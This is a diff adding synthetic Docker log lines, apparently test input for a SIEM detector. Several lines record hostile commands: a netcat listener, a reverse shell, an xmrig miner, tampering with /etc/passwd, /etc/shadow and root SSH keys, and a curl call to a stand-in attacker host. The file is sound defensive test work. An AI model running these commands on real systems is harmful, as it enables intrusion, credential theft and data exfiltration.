@@ -1,0 +1,18 @@
+# Sample Docker Logs for AstroSIEM Testing
+
+[DOCKER_CONTAINER] container=web-app image=nginx:latest [20/Feb/2026:10:15:23] GET /admin 200
+[DOCKER_CONTAINER] container=web-app image=nginx:latest [20/Feb/2026:10:16:00] suspicious process detected: nc -l -p 4444
+[DOCKER_CONTAINER] container=database image=mysql:8.0 [20/Feb/2026:10:17:00] Root user accessed from unusual IP 192.168.1.100
+[DOCKER_CONTAINER] container=app-server image=ubuntu:20.04 [20/Feb/2026:10:18:00] chmod 777 /etc/passwd executed
+[DOCKER_CONTAINER] container=redis image=redis:7 [20/Feb/2026:10:19:00] Crypto mining detected: xmrig process running
+[DOCKER_CONTAINER] container=web-app image=nginx:latest [20/Feb/2026:10:20:00] Reverse shell detected: /bin/sh -i
+[DOCKER_CONTAINER] container=mongo image=mongo:5 [20/Feb/2026:10:21:00] Data exfiltration attempt: curl http://attacker.com | base64
+[DOCKER_CONTAINER] container=jenkins image=jenkins/jenkins [20/Feb/2026:10:22:00] /root/.ssh/authorized_keys modified
+[DOCKER_CONTAINER] container=app-server image=ubuntu:20.04 [20/Feb/2026:10:23:00] privileged mode requested
+[DOCKER_CONTAINER] container=postgres image=postgres:14 [20/Feb/2026:10:24:00] /etc/shadow accessed
+
+[DOCKER_DAEMON] [20/Feb/2026:10:15:00] Docker daemon started
+[DOCKER_DAEMON] [20/Feb/2026:10:25:00] Container web-app restarted unexpectedly (exit 137)
+[DOCKER_DAEMON] [20/Feb/2026:10:26:00] Volume mount detected: -v /host/data:/container/data
+[DOCKER_DAEMON] [20/Feb/2026:10:27:00] docker.sock access from container app-server
+[DOCKER_DAEMON] [20/Feb/2026:10:28:00] OOM killed container database
